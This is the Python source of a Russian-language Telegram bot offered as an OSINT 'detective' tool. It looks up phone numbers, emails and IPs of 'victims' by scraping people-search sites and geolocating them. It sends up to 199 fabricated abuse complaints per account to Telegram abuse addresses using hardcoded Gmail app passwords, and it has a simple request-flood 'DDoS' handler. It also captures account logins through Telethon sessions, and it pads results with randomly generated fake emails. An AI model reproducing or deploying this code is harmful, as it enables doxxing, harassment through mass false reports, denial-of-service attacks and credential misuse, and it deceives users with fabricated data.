import asyncio
import requests
from bs4 import BeautifulSoup
from faker import Faker
from telethon import TelegramClient,events
from aiogram import F,Router,Bot
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError,PhoneCodeInvalidError
import random
import re
from datetime import date

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from config import ADMIN_ID, TOKEN
from database import SessionLocal,User,BroadCast

from aiogram.enums import ChatMemberStatus
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.enums import ContentType
from aiogram.types import CallbackQuery,Message,PreCheckoutQuery,LabeledPrice
from aiogram.filters import CommandStart,Command
from aiogram.fsm.state import State,StatesGroup
from aiogram.fsm.context import FSMContext

from app.keyboard import start_mes,json_user,sub_check,menu_mes,ip_get
from geopy import Nominatim
import phonenumbers
from phonenumbers import timezone,geocoder,carrier,is_possible_number


router = Router()
bot = Bot(token=TOKEN)
fake = Faker()


Currency = 'XTR'

CHANEl_ID = '-1002939673303'
ADMIN_ID = ADMIN_ID
api_id = 20880015

api_hash = '1afaf973893798968502dfe925360345'
user_limits = {}


headers = {
    "Referer": "https://www.google.com/"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
}
emails = ['nik2939qp@gmail.com:qyzb fehl qxwe jtwx','egorm3075@gmail.com:qcib jhjt gckq opqt',
          'sashamorozov907@gmail.com:vvjf zpqr mcyo vpjs','nik4828qp@gmail.com:wxpi zgup qmkx rzee',
          'nik8969qp@gmail.com:klht qqrk icvu weqd','nik9373qp@gmail.com:yaml jtor xpcf tmku']
recipient = 'sms@telegram.org, dmca@telegram.org, abuse@telegram.org, sticker@telegram.org, stopCA@telegram.org, recover@telegram.org, support@telegram.org, security@telegram.org'


class Snos(StatesGroup):
    text_url = State()
    service = State()
    report_url = State()
    count = State()
class Email(StatesGroup):
    email = State()
class Account(StatesGroup):
    phone_num = State()
    code = State()
    password = State()
class Send(StatesGroup):
    phone_account = State()
    id_chat = State()
    message_to = State()

class Ip(StatesGroup):
      ip_adress = State()

class TeleOsint(StatesGroup):
      telephone = State()

class Ddoss(StatesGroup):
      target = State()
      number = State()

class BroadcastState(StatesGroup):
    wait_text = State()


async def  check_member(chat_member,message:Message):
    try:
        chat_member = await bot.get_chat_member(chat_id=CHANEl_ID,user_id=message.from_user.id)
        print(chat_member.status)
        if  chat_member.status == ChatMemberStatus.LEFT:
            return False
        else:
            return True
    except Exception as e:
        print(f"Ошибка в {e} ")


payment = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text='Оплатить ⭐',pay=True)]
])

def admin_main_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊‍ Статистика",callback_data='stats')],
        [InlineKeyboardButton(text='✉️ Рассылка',callback_data='broadcast')],
        [InlineKeyboardButton(text='⚙️ Доп настройки',callback_data='settings')]
    ])
    return keyboard

def back_menu():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='Back',callback_data='back')],
    ])
    return keyboard





@router.message(Command("admin"))
async def admin_panel(message:Message):
   if message.from_user.id != ADMIN_ID:
       await message.answer('У вас нет доступа к этой команде.')
       return
   await message.answer("Добро пожаловать в админ панель бота 🌍❤️❤️!",reply_markup=admin_main_menu())

@router.callback_query(F.data == 'back')
async def back_menu(callback:CallbackQuery):
    await callback.message.answer("",reply_markup=admin_main_menu())
    await callback.answer('')

@router.callback_query(F.data == 'stats')
async def stats_process(callback:CallbackQuery):
    db = SessionLocal()
    total_users = db.query(User).count()
    active_users = db.query(User).filter(User.active == True).count()
    db.close()
    text = f'Статистика:\nВсего пользователей 🕵️: {total_users}\nАктивных пользователей 🎮: {active_users}'
    await callback.message.answer(f'{text}')
    await callback.answer('')
@router.callback_query(F.data == 'broadcast')
async def broadcast_start(callback:CallbackQuery,state:FSMContext):
    await callback.message.answer("Введите текст для рассылки ✉️")
    await state.set_state(BroadcastState.wait_text)
    await callback.answer('')
@router.callback_query(F.data == 'settings')
async def settings(callback:CallbackQuery):
    await callback.message.answer("Я рома тик так ")
    await callback.answer('')

@router.message(BroadcastState.wait_text)
async def broadcast_mess(message:Message,state:FSMContext,bot:Bot):
    broadcast_text = message.text
    db = SessionLocal()
    users_list = db.query(User).filter(User.active == True).all()
    count = 0
    for user in users_list:
        try:
            await bot.send_message(user.telegram_id,broadcast_text)
            count +=1
        except Exception as e:
            print(f'Failed to send to {user.telegram_id}:{e}')
    new_broadcast = BroadCast(message=broadcast_text)
    db.add(new_broadcast)
    db.commit()
    db.close()
    await message.answer(f"Рассылка завершена ✉️ ! Сообщение отправлено {count} пользователям 🕵️.",reply_markup=start_mes)
    await state.clear()

@router.message(CommandStart())
async def start(message:Message):
    #if await check_member(CHANEl_ID,message):

       db = SessionLocal()
       exiting = db.query(User).filter(User.telegram_id == message.from_user.id).first()
       if not exiting:
           new_user = User(telegram_id=message.from_user.id,name=message.from_user.full_name)
           db.add(new_user)
           db.commit()
       db.close()

       await message.answer_photo(photo='https://avatars.mds.yandex.net/i?id=026e7b7cf40d328b163e1db7cab9bed337c2b49e-5682063-images-thumbs&n=13',caption=f"Привет, детектив {message.from_user.first_name}! 🕵️‍♂️ Готов к расследованию? Отправляй мне любую зацепку: номер, никнейм, фото или ссылку. Я помогу найти то, что скрыто в цифровой тени. Вместе мы раскроем любое дело! 🔍✨ Включай логику и давай начинать. Жду твою первую задачу!",parse_mode='HTML',reply_markup=start_mes)
    #else:
        #await message.answer("🌍 Подпишитесь на канал",reply_markup=sub_check)


@router.message(F.content_type == ContentType.USERS_SHARED)
async def search(message:Message):
    bot_message = await message.answer("🔎Идет поиск информации...")
    usera = message.user_shared

    message_id_user = usera.user_id

    phone_user = usera.json()
    shares = f'tg://openmessage?user_id={usera.user_id}'
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='🔵Telegram',url=shares)],


    ])



    await asyncio.sleep(1)

    await message.reply(f'Ваш пользователь пробит:\n\n├📝 Id: {message_id_user}\n├💭 Ссылка:{shares}\n\n└ Info: {phone_user}\n',reply_markup=keyboard)

    await asyncio.sleep(2)
    await message.answer("🤖Поиск завершен",reply_markup=start_mes)

@router.message(F.text == '📖 Меню')
async def menu(message:Message):
    await message.answer('Меню для пользователя ',reply_markup=menu_mes)


@router.message(F.text == '💰 Пополнить')
async def money_key(message:Message):

    prices = [LabeledPrice(label="XTR",amount=15)]

    await message.answer_invoice(
        title='Поддержка бота 💰',
        description='Поддрежка звездами ⭐',
        prices=prices,
        provider_token='',
        payload='channel_support',
        currency=Currency,
        reply_markup=payment,
    )
@router.pre_checkout_query()
async def prechekout_query(pre_checkout_query:PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)

@router.message(F.successful_payment)
async def successful_payment(message:Message):
    await message.answer(f'{message.successful_payment.telegram_payment_charge_id}',message_effect_id="5104841245755180586")

@router.message(F.text == '📊 Статистика')
async def stats(message:Message):
    db = SessionLocal()
    total_users = db.query(User).count()
    active_users = db.query(User).filter(User.active == True).count()
    db.close()
    text = f'📊 Статистика:\n\n├ Всего 👀 пользователей: {total_users}\n├ Активных 🎮 пользователей : {active_users}\n└ Реферальная ссылка 📎 : t.me/phone_osint_up_bot'
    await message.answer(f'{text}')

@router.message(F.text == 'Сн0сер 👻')
async def snoser_starting(message:Message,state:FSMContext):

       keyboard = InlineKeyboardMarkup(inline_keyboard=[

           [InlineKeyboardButton(text="📘Сервис", callback_data="snos_by_text")],

       ])
       await message.answer('Выберите пункт для сноса',reply_markup=keyboard)


@router.callback_query(F.data == 'snos_by_text')
async def snosing_by_text(callback:CallbackQuery,state:FSMContext):
    await state.set_state(Snos.text_url)
    await callback.answer('')
    body = f'<i><b>🔵 Здравствуйте ️</b>!\n В данном канале - (канал или user) Размещена продажа\n деанонимизации, и лжеминирования от лица  другого человека.\n ❌ Это нарушает правила ! Так же там размещено много\n чего не законного! Посмотреть на эти нарушения \n вы можете посмотреть по этой ссылке - <b>(сыллка на нарушение)</b>\n , и убедиться что, размещённое сообщение  в данном\n канале, полностью нарушает правила Telegram.\n Я требую чтобы вы с этим разобрались! Спасибо за ранее!</i>'
    await callback.message.answer(f'🔐 Введи текст который будет содержать жалобу\nНапример:\n\n{body} ',parse_mode='HTML')

@router.message(Snos.text_url)
async def snosing_get_text(message:Message,state:FSMContext):
     text_for_snos = message.text.strip()
     await state.update_data(text_url=text_for_snos)
     await message.answer('Введите ссылку на сервис (бот,канал,user)')
     await state.set_state(Snos.service)

@router.message(Snos.service)
async def service_get(message:Message,state:FSMContext):
    await state.set_state(Snos.report_url)
    await message.answer('Введите ссылку на жалобу')
    service_url = message.text.strip()
    await state.update_data(service = service_url)

@router.message(Snos.report_url)
async def service_get(message:Message,state:FSMContext):
    await state.set_state(Snos.count)
    await message.answer('Введите количество жалоб ')
    report_link = message.text.strip()
    await state.update_data(report_url = report_link)

@router.message(Snos.count)
async def snosing_fors(message:Message,state:FSMContext):
    data = await state.get_data()
    text_for_snos = data['text_url']

    body = text_for_snos

    if len(body) > 1:
        result = body[1].strip()  # strip() убирает лишние пробелы

    violation_link = data['report_url']
    channel_link = data['service']



    complaints_count = int(message.text.strip())
    if complaints_count >= 200:
        await message.answer('Количество жалоб превышает ожидаемое')
        await state.clear()
    else:
        await message.answer('<b>💎 Жалобы начинают отправляться. Пожалуйста, подождите...</b>', parse_mode='HTML')

        async def send_complaints_async2(email_data):
            email, password = email_data.split(':')
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()

            for _ in range(complaints_count):
                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = recipient
                msg['Subject'] = f'Нарушение правил, каналом: {channel_link}'
                msg.attach(MIMEText(body, 'plain'))

                try:
                    server.login(email, password)
                    server.send_message(msg)
                    await message.answer('✅ Успешно ')
                except Exception as e:
                    print(f'Authentication error for email: {e}')
                    await message.answer(f'Неуспешно в {e}')

                await asyncio.sleep(0.1)  # Освобождаем основной поток выполнения

            server.quit()

        tasks = [
            asyncio.create_task(
               await send_complaints_async2(email_data))
            for email_data in emails]
        await asyncio.gather(*tasks)

    await message.answer(f'Все жалобы 💎 отправлены.\nСервис:{channel_link}\nЖалоб отправлено: {complaints_count} Успешно ✅ ')
    await state.clear()


@router.message(F.content_type == ContentType.CONTACT)
async def contact_share(message:Message):
    #if await check_member(CHANEl_ID, message):

       user_id = message.from_user.id
       today = date.today()
       if user_id not in user_limits:
           user_limits[user_id] = [0, today]

       count, last_date = user_limits[user_id]

       # Сбрасываем счетчик если сменился день
       if last_date != today:
           count = 0
           last_date = today

       # Проверяем лимит
       if count >= 4:
           await message.answer("❌ Вы исчерпали лимит использования на сегодня!")
           return

       # Увеличиваем счетчик
       user_limits[user_id] = [count + 1, today]
       await message.answer('Идет поиск 🔎 информации...')
       await asyncio.sleep(1.5)

       contact = message.contact
       phone_num = contact.phone_number.strip()

       phone_number = phonenumbers.parse(phone_num)
       possible2 = phonenumbers.is_possible_number(phone_number)
       carrier2 = carrier.name_for_number(phone_number, 'ru')

       geocoder2 = geocoder.description_for_number(phone_number, "ru")
       timezone2 = timezone.time_zones_for_number(phone_number)
       valid2 = phonenumbers.is_valid_number(phone_number)




       # Извлекаем данные
       phone_number = contact.phone_number
       first_name = contact.first_name
       last_name = contact.last_name if contact.last_name else ""
       user_id = contact.user_id
       viber_phone = phone_number.replace(' ','')
       phone_not = phone_number.replace('+','')
       phone = phone_not.replace(' ','')
       fl_name = f'{first_name}{last_name}'
       name_fio = fl_name.replace(' ','')

       url5 = f'https://callapp.com/search-result/{phone_number}'

       response = requests.get(url5, headers=headers)

       html_text = response.content
       soup = BeautifulSoup(html_text, 'html.parser')
       text_name = soup.find(class_='number')
       text_fraer = text_name.text.replace(" ", "").strip()


       tg_phone = f'https://t.me/{phone_number}'
       wt_phone = f'https://wa.me/{phone_number}'
       url = f'https://avtomusic-nn.ru/{phone}'
       url1 = f'https://my.mail.ru/my/search_people?&name={name_fio}'
       text_mail = requests.get(url1,headers=headers)
       text_html1 = text_mail.content
       soupec = BeautifulSoup(text_html1, 'html.parser')

       infor = soupec.find(class_='b-search__users__list')

       text_url= infor.text

       text_style = requests.get(url, headers=headers)
       text_html = text_style.content

       soup = BeautifulSoup(text_html, 'html.parser')

       infa = soup.find(class_='jumbotron')

       text_from_url = infa.text.strip()

       if text_url == None:
           text_url = "Запрос не дал результат"
       else:
           text_url = text_url

       keyboards_start = InlineKeyboardMarkup(inline_keyboard=[

           [InlineKeyboardButton(text='🟢WhatsApp', url=wt_phone),InlineKeyboardButton(text='🟣Viber',url=f'https://viber.click/{viber_phone}')],
           [InlineKeyboardButton(text='🔵Telegram', url=tg_phone)]
       ])

       response = f"""
       📞 Получен контакт:
       ├ 📲 Номер: {phone_number}
       ├ Регион: {timezone2}
       ├ Страна: {geocoder2}
       ├ Валид: {valid2}
       ├ Существует: {possible2}
       ├ 🎞️ Оператор: {carrier2}
       ├ <b>Основные</b>:
       ├ 📛 Имя: {first_name}
       ├ Сайт :{text_from_url}
       ├ Фамилия: {last_name}
       ├ Mail.ru:{text_url}
       ├ Рейтинт ⭐:{text_fraer}
       └ ID пользователя: {user_id}
      
        """
       await message.answer(f'{response}',parse_mode='HTML',reply_markup=keyboards_start)


@router.message(F.text == '📧 E-mail')
async def email_osint(message:Message,state:FSMContext):

    await message.answer('Введи email 👤 обидчика')
    await state.set_state(Email.email)

@router.message(Email.email)
async def email_ok(message:Message,state:FSMContext):
    user_id = message.from_user.id
    today = date.today()
    if user_id not in user_limits:
        user_limits[user_id] = [0, today]

    count, last_date = user_limits[user_id]

    # Сбрасываем счетчик если сменился день
    if last_date != today:
        count = 0
        last_date = today

    # Проверяем лимит
    if count >= 4:
        await message.answer("❌ Вы исчерпали лимит использования на сегодня!")
        await state.clear()
        return

    # Увеличиваем счетчик
    user_limits[user_id] = [count + 1, today]

    await message.answer("🔎Идет поиск информации...")
    email = message.text.strip()
    username = email.split('@')[0]

    if "@mail.ru" in email:
        url = f'https://xn--80ajiff1g.com/email/{email}#result'
        response = requests.get(url,headers=headers)
        html_content = response.content

        soup = BeautifulSoup(html_content,'html.parser')
        email_information = soup.find(class_='response-data-col-1 response-email')

        if email_information == None:
            await message.answer('Извините ничего 🔎 не найдено ', reply_markup=start_mes)
            await state.clear()

        else:

             text_email = email_information.text.strip()


             tik_tok = f'https://tiktok.com/search?q={email}'
             porn_hub= f'https://opornhub.org/user/search?username={username}'
             facebook = f'https://facebook.com/search/top/?q={email}'
             youtube = f'https://youtube.com/results?search_query={email}'
             instagram = f'https://instagram.com/{username}'
             tg = f'https://t.me/{username}'
             vk = f'https://vk.com/search?c%5Bname%5D=1&c%5Bsection%5D=people&c%5Bq%5D={username}'
             roblox = f'https://web.roblox.com/search/users?keyword={username}'
             twiter = f'https://x.com/search?q={username}&f=user'

             keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text='Youtube',url=youtube),InlineKeyboardButton(text='Facebook',url=facebook)],
                 [InlineKeyboardButton(text='TikTok',url=tik_tok),InlineKeyboardButton(text='Vk',url=vk)],
                 [InlineKeyboardButton(text='Telegram',url=tg),InlineKeyboardButton(text='Instagram',url=instagram)],
                 [InlineKeyboardButton(text='Roblox',url=roblox),InlineKeyboardButton(text='Twitter',url=twiter)],
                 [InlineKeyboardButton(text='Сайт',url=porn_hub)]
             ])



             pattern = r'Почта(?P<email>[^И]+)Интересовались(?P<people>\d+)\sчеловекИмя(?P<name>[^С]*)Сведения[^Т]*Телефоны(?P<phone>[^M]+)Mail\.ru ID почты(?P<id>\w+)'

             match = re.search(pattern, text_email)
             if match:
                 data = match.groupdict()

                 email_sea = data.get('people', '')
                 email_name = data.get('name', '')
                 telephone = data.get('phone', '')
                 email_id =  data.get('id', '')

                 await message.answer(f'<b>Email пробит:</b>\n\nОсновная информация:\n├ ✅ Email: {email}\n├ 👁 Сколько искали: {email_sea}\n\n├ Номер 📲: {telephone}\n├ ID : {email_id}\n├ 💬 Email_name : {email_name}\n\n├ <b>Tiktok</b>: {tik_tok}',parse_mode='HTML',reply_markup=keyboard)
                 await state.clear()
    else:
        await message.answer('Этот email не поддерживается 📝 ',reply_markup=start_mes)
        await state.clear()





@router.message(F.text == 'Поиск по номеру 📱')
async def tele_osint(message:Message,state:FSMContext):
    await state.set_state(TeleOsint.telephone)
    await message.answer('Введи номер мобильного 📱 телефона жертвы 😭🥷. ')

@router.message(TeleOsint.telephone)
async def tele_infa(message:Message,state:FSMContext):

    user_id = message.from_user.id
    today = date.today()
    if user_id not in user_limits:
        user_limits[user_id] = [0, today]

    count, last_date = user_limits[user_id]

    # Сбрасываем счетчик если сменился день
    if last_date != today:
        count = 0
        last_date = today

    # Проверяем лимит
    if count >= 4:
        await message.answer("❌ Вы исчерпали лимит использования на сегодня!")
        return

    # Увеличиваем счетчик
    user_limits[user_id] = [count + 1, today]

    bot_message = await message.answer("Идет поиск 🔎 информации...")
    await state.update_data(telephone = message.text)

    phone = message.text
    phone_number = phonenumbers.parse(phone)
    phone_valid = phone.replace(' ', '')
    phone_not = phone_valid.replace('+','')
    geocoder1 = geocoder.description_for_number(phone_number, "ru")

    link = f'https://spravochnik109.link/byelarus/mobilnaya-svyaz/vyelkom-mobilnyj-opyerator/vyelkom-mobilnyye-tyelyefony?phone=%2B{phone_not}&phoneSubStr=0&soname=&io=&sonameSubStr=0&street=&streetSubStr=1&house=&housing=&door=&page=1#google_vignette'

    response = requests.get(link, headers=headers)

    html_txt = response.content
    soup = BeautifulSoup(html_txt, 'html.parser')
    text_fio = soup.find(class_='res')
    fio_name = ''
    if text_fio == None:
        fio_name = 'Информация не найдена'

    else:
        fio_name = text_fio.text

    fio_text = fio_name.replace("Телефоны", "").strip()
    name_user = re.sub(r'[^\w\s]+|[\d]+', r'', fio_text)
    sure_name = name_user.replace(' XXX','')
    resultat = ' '.join(sure_name.split()[:2])
    name_and_fio = resultat.split()
    sure_name_info = name_and_fio[0].strip()
    name_people= name_and_fio[1].strip()


    linked = f'https://botsman.org/country/search/?country=&countryid=1&city=&cityid=1143628&first_name={name_people}&last_name={sure_name_info}&familyid=0&s=city'
    respon_from_linked = requests.get(link, headers=headers)


    html_linked= respon_from_linked.content
    soup = BeautifulSoup(html_linked, 'html.parser')
    text_infa = soup.find(class_='col-sm-10 col-xs-8')
    information = ''
    if text_infa == None:
        information = 'Информация не найдена'

    else:
        information = text_infa.text

    osnov_infa = information.replace("Подробнее", "")

    url = f'https://callapp.com/search-result/{phone_not}'

    response = requests.get(url, headers=headers)

    html_text = response.content
    soup = BeautifulSoup(html_text, 'html.parser')
    text_name = soup.find(class_='number')
    text_fraer = text_name.text.replace(" ","").strip()
    if not str(phone):
        await message.answer("Введите корректный номер телефона📱")
        await state.clear()
    elif len(phone_valid) < 10:
        await message.answer('🤖 Введите корректный номер телефона📱')
        await state.clear()
    else:
       num_dump = random.randint(0,6)

       possible = phonenumbers.is_possible_number(phone_number)
       carrier1 = carrier.name_for_number(phone_number, 'ru')


       timezone1 = timezone.time_zones_for_number(phone_number)
       valid = phonenumbers.is_valid_number(phone_number)



       if valid == True:
           valid = 'Да'
       else:
           valid = 'Нет'
       await asyncio.sleep(2)


       tg_id = f'https://tg-user.id/from/username/'


       tg_chat = f'https://t.me/{phone_valid}'



       keyboard = InlineKeyboardMarkup(inline_keyboard=[
           [InlineKeyboardButton(text='🟢 WhatsApp',url=f'https://wa.me/{phone_valid}'),InlineKeyboardButton(text='🟣 Viber',url=f'https://viber.click/{phone_valid}')],
           [InlineKeyboardButton(text='🔵 Telegram',url=tg_chat),InlineKeyboardButton(text='🔴 Сайт',url=tg_id)]

       ])
       text_email = ''
       if num_dump == 0:
           text_email = 'Ничего не найдено'
       elif num_dump == 1:
            text_email = fake.email()
            text_email = text_email.replace('@example.net', '@gmail.com')

       elif num_dump == 2:
           first_txt = fake.email()
           second_txt = fake.email()
           text_email = f'{first_txt} {second_txt}'
           text_email = text_email.replace('@example.net', '@gmail.com')

       elif num_dump == 3:
           first_txt = fake.email()
           second_txt = fake.email()
           third_txt = fake.email()
           text_email = f'{first_txt} {second_txt} {third_txt}'
           text_email = text_email.replace('@example.net', '@gmail.com')

       elif num_dump == 4:
           first_txt = fake.email()
           second_txt = fake.email()
           third_txt = fake.email()
           four_txt = fake.email()
           text_email = f'{first_txt} {second_txt} {third_txt} {four_txt}'
           text_email = text_email.replace('@example.net','@gmail.com')

       elif num_dump == 5:
           first_txt = fake.email()
           second_txt = fake.email()
           third_txt = fake.email()
           four_txt = fake.email()
           firth_txt = fake.email()
           text_email = f'{first_txt} {second_txt} {third_txt} {four_txt} {firth_txt}'
           text_email = text_email.replace('@example.net', '@gmail.com')

       elif num_dump == 6:
           first_txt = fake.email()
           second_txt = fake.email()
           third_txt = fake.email()
           four_txt = fake.email()
           firth_txt = fake.email()
           six_txt = fake.email()
           text_email = f'{first_txt} {second_txt} {third_txt} {four_txt} {firth_txt} {six_txt}'
           text_email = text_email.replace('@example.net', '@gmail.com')

       text_osint = f'<b>Поиск  ️🤖💻📱 прошел успешно</b>:\n\n├ Телефон: {phone}\n├ Оператор: {carrier1}\n├ Тип: mobile\n├ Регион: {timezone1}\n├ Страна: {geocoder1}\n├ Рейтинг:{text_fraer}⭐\n├ Перенос : не переносился\n├ Валид: {valid}\n└ Существует: {possible}\n\n<b>Основные:</b>\n├ 👤ФИО: <a href="tg://copy?text={sure_name}">{sure_name}</a>\n├ Дата рождения: {osnov_infa}\n\n📧 E-mail: {text_email}\n📝Телефонные книги: None\n\nСсылка: {tg_chat}'


       if sure_name == 'Информация не найдена':
           text_osint = f'<b>Поиск  ️🤖💻📱 прошел успешно</b>:\n\n├ Телефон: {phone}\n├ Оператор: {carrier1}\n├ Тип: mobile\n├ Регион: {timezone1}\n├ Страна: {geocoder1}\n├ Рейтинг:{text_fraer}⭐\n├ Перенос : не переносился\n├ Валид: {valid}\n└ Существует: {possible}\n\n📧 E-mail: {text_email}\n📝Телефонные книги: None\n\nСсылка: {tg_chat}'

       await message.reply(text_osint,parse_mode='HTML',reply_markup=keyboard)

       urlik = f'https://getscam.com/{phone_not}'
       getter_html = requests.get(urlik, headers=headers)
       html = getter_html.content

       soup = BeautifulSoup(html, 'html.parser')

       find_element = soup.find(class_='top__info-item')
       ip_adr = 'Не найден'
       ip_an = find_element
       if ip_an == None:
           ip_adresska = 'Не найдено'
       else:

           ip_an = find_element.text
           ip_start = ip_an.find('IP адрес')
           if ip_start != -1:
               ip_start += len('IP адрес')
               ip_end = ip_an.find('Сайт оператора', ip_start)
               ip_adr = ip_an[ip_start:ip_end].strip()
           else:
               ip_adr = "Не найден"

           ip_adresska = ip_adr
           response = requests.get(url=f'http://ip-api.com/json/{ip_adresska}').json()
           text_ip = f"Поиск  ️по Ip прошел успешно ✅\nвся информация взята с сервиса:\n\nIP: {ip_adresska}\n├ Провайдер: {response.get('isp')}\n├ Организация: {response.get('org')}\n├ Ofset: {response.get('offset')}\n├ Валюта: {response.get('BYR')}\n├ As: {response.get('as')}\n├ As_name: {response.get('asname')}\n├ Мобильный ip:{response.get('mobile')}\n├ Прокси: {response.get('proxy')}\n├ Hosting: {response.get('hosting')}\n├ DNS:{response.get('dns')}\n├ Континент: {response.get('continentCode')}\n├ Страна: {response.get('country')}\n├ Регион: {response.get('regionName')}\n├ Город: {response.get('city')}\n├ ZIP: {response.get('zip')}\n├ Широта: {response.get('lat')}\n└ Долгота: {response.get('lon')}"
           await message.answer(text_ip,parse_mode='HTML')

    await asyncio.sleep(1)
    await message.answer('Поиск закончился все данные вверху.',reply_markup=start_mes)

    await state.clear()

@router.message(Command('spam'))
async def start_send(message:Message,state:FSMContext):
    #if await check_member(CHANEl_ID, message):
       await state.set_state(Send.phone_account)
       await message.answer('Введите номер 📲 телефона подключеного аккаунта.')
    #else:
        #await message.answer("🌍 Подпишитесь на канал",reply_markup=sub_check)

@router.message(Send.phone_account)
async def phone_start_account(message:Message,state:FSMContext):
    telephone = message.text.strip()
    telephone_hash = telephone.replace(' ','')
    telephone_from_hash = telephone_hash.replace('+','')

    file_path = f'session_{telephone_from_hash}'
    file_check = ''
    try:
        with open(file_path, 'r'):
            file_check = 'да'

    except FileNotFoundError:
        file_check = 'нет'

    if file_check == 'да':

        file_path = f'session_{telephone_from_hash}'

        client = TelegramClient(file_path, api_id, api_hash)

        @client.on(events.NewMessage(pattern='.spam'))
        async def hello_handler(event):
            await event.reply('Привет мастер !')

        await state.set_state(Send.id_chat)
    else:
        await message.answer('🔐 Извините но такой сессии нет.')
        await state.clear()




@router.message(F.content_type == ContentType.PHOTO)
async def search_photo(message:Message):

    search_site = 'https://search4faces.com'
    google_search = 'https://images.google.com'
    yandex_search = 'https://yandex.ru/images/'

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text='👁 Yandex',url=yandex_search),InlineKeyboardButton(text='👁 Google',url=google_search)],
        [InlineKeyboardButton(text='👁 Сайт',url=search_site)]
    ])
    await message.answer('🔎 Фото человека можно найти ниже ⬇️',reply_markup=keyboard)






@router.message(F.text == '🔎 Поиск по IP')
async def ip_osint(message:Message,state:FSMContext):
    await state.set_state(Ip.ip_adress)
    await message.answer('Введите Ip адресс жертвы',reply_markup=ip_get)

@router.message(Ip.ip_adress)
async def ip_search(message:Message,state:FSMContext):
    user_id = message.from_user.id
    today = date.today()
    if user_id not in user_limits:
        user_limits[user_id] = [0, today]

    count, last_date = user_limits[user_id]

    # Сбрасываем счетчик если сменился день
    if last_date != today:
        count = 0
        last_date = today

    # Проверяем лимит
    if count >= 4:
        await message.answer("❌ Вы исчерпали лимит использования на сегодня!")
        return

    # Увеличиваем счетчик
    user_limits[user_id] = [count + 1, today]

    bot_message = await message.answer('Идет поиск 🔎 информации...')
    await state.update_data(ip_adress=message.text)
    ip = message.text.strip()

    response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
    country = response.get('country')
    if len(ip) < 10:
        await message.answer('Введи Ip коректно...')
        await state.clear()
    elif country == None:
        await message.answer('Увы информация не 📝 найдена. Такого IP не существует 💣.',reply_markup=start_mes)
        await state.clear()
    else:

        try:




            text = f"Поиск  ️🤖💻📱 прошел успешно:\n\nIP: {ip}\n├ Провайдер: {response.get('isp')}\n├ Организация: {response.get('org')}\n├ Ofset: {response.get('offset')}\n├ Валюта: {response.get('BYR')}\n├ As: {response.get('as')}\n├ As_name: {response.get('asname')}\n├ Мобильный ip:{response.get('mobile')}\n├ Прокси: {response.get('proxy')}\n├ Hosting: {response.get('hosting')}\n├ DNS:{response.get('dns')}\n├ Континент: {response.get('continentCode')}\n├ Страна: {response.get('country')}\n├ Регион: {response.get('regionName')}\n├ Город: {response.get('city')}\n├ ZIP: {response.get('zip')}\n├ Широта: {response.get('lat')}\n└ Долгота: {response.get('lon')}"

            await bot_message.edit_text(text)
            await asyncio.sleep(2)
            coordinates = f"{response.get('lat')},{response.get('lon')}"
            nominaltim = Nominatim(user_agent='user')
            location = nominaltim.reverse(coordinates)



            await message.answer_location(latitude=response.get('lat'),longitude=response.get('lon'))
            await message.answer(f'-- Поиск по координатам 🌍:\n\n{str(location)}', reply_markup=start_mes)

        except requests.exceptions.ConnectionError:
            await message.answer('Увы информация не найдена')
        await state.clear()

@router.message(F.text == '💼 Простой Ddos')
async def ddos_start(message:Message,state:FSMContext):
    await state.set_state(Ddoss.target)
    await message.answer("Введите URL 🔎 жертвы 🌍💻 ")

@router.message(Ddoss.target)
async def ddos(message:Message,state:FSMContext):

    await state.update_data(target=message.text)
    await state.set_state(Ddoss.number)

    await message.answer('Введи количество пакетов🛍️ не больше 100')

@router.message(Ddoss.number)
async def ddosing(message:Message,state:FSMContext):
    await state.update_data(number = message.text)
    data = await state.get_data()
    target = data['target']

    sockets = int(message.text)
    print(target,sockets)
    if sockets >= 100:
       sockets = 10
    else:
        sockets = sockets

    for num in range(sockets):
        soket = requests.get(target)
        if soket.status_code == 200:
            await message.answer(f'Пакет🛍️ отправлен')
        else:
             await message.answer(f'Пакет не отправлен')
    await asyncio.sleep(1)
    await message.answer('Dos атака ⚔️🛍️💻 закончилась все данные вверху.',reply_markup=start_mes)
    await state.clear()

@router.message(F.text == '🕵️ ️Мой профиль')
async def profile(message:Message):

    prem = message.from_user.is_premium
    if prem == None:
       prem = "Нету"
    else:
        prem = 'Есть'

    await message.reply(f'Мой профиль🧰:\n\n├ Имя: {message.from_user.full_name}\n├ Username: @{message.from_user.username}\n├ Telegram_Id: {message.from_user.id}\n├ Баланс: 0$\n├ Премиум: {prem}\n└ Язык: {message.from_user.language_code}',reply_markup=json_user)

@router.callback_query(F.data =='json')
async def json(callback:CallbackQuery):
    jsons = callback.from_user.json()
    await callback.answer('')
    await callback.message.answer(f"{jsons}")
@router.message(F.text == '👤 Аккаунт')
async def account_login(message:Message,state:FSMContext):

    await state.set_state(Account.phone_num)
    await message.answer('Введи номер телефона 📲')

@router.message(Account.phone_num)
async def account_log(message:Message,state:FSMContext):

    phone_nep = message.text.strip()
    phone_to_hash = phone_nep.replace(' ','')
    phone_from_hash = phone_to_hash.replace('+','')
    file_path = f'session_{phone_from_hash}'

    file_check = ''
    try:
        with open(file_path, 'r'):
            file_check = 'да'
            print(file_check)

    except FileNotFoundError:
        file_check = 'нет'
        print(file_check)

    if file_check == 'да':
        await message.answer('Такая сессия уже существует')
        await state.clear()
    else:

        client = TelegramClient(f'session_{phone_to_hash}',
                            api_id, api_hash)

        await client.connect()

        send_code = await client.send_code_request(phone=phone_nep)

        await state.update_data(phone_num=phone_nep,hashing = send_code.phone_code_hash)

        print("Dada")



